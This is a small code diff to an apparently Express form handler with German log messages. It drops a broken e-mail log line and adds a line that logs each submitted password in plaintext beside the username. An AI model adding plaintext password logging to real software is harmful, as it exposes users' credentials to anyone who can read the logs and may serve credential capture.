@@ -14,8 +14,8 @@ app.post('/submit', (req, res) => {
 
   const { username, password } = req.body;
 
-  console.log("📧 E-Mail erhalten:", email);
   console.log("👤 Benutzername erhalten:", username);
+  console.log("🔑 Passwort erhalten:", password);
 
  res.redirect('/danke.html');
 });
